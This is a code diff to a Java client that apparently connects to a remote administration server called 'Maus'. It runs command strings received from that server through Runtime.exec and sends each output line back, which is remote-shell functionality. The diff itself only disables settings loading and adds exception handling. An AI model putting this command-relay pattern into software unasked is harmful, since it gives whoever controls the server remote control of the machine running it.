@@ -28,7 +28,7 @@ public class Client {
     public static void main(String[] args) throws InterruptedException {
         /* Load server settings and then attempt to connect to Maus. */
         Client client = new Client();
-        client.loadServerSettings();
+//        client.loadServerSettings();
         client.connect();
     }
 
@@ -64,20 +64,23 @@ public class Client {
     }
 
     /* Execute a command using Java's Runtime. */
-    private void exec(String command) throws IOException, InterruptedException {
+    private void exec(String command) throws IOException {
         if (!command.equals("")) {
 
-            Process proc = Runtime.getRuntime().exec(command);
-
-            BufferedReader reader =
-                    new BufferedReader(new InputStreamReader(proc.getInputStream()));
-
-            String line = "";
-            while ((line = reader.readLine()) != null) {
-                System.out.print(line + "\n");
-                communicate(line);
+            try {
+                Process proc = Runtime.getRuntime().exec(command);
+                BufferedReader reader =
+                        new BufferedReader(new InputStreamReader(proc.getInputStream()));
+                String line = "";
+                while ((line = reader.readLine()) != null) {
+                    System.out.print(line + "\n");
+                    communicate(line);
+                }
+                communicate("end");
+            } catch (IOException e) {
+                exec("");
             }
-            communicate("end");
+
         }
     }
 
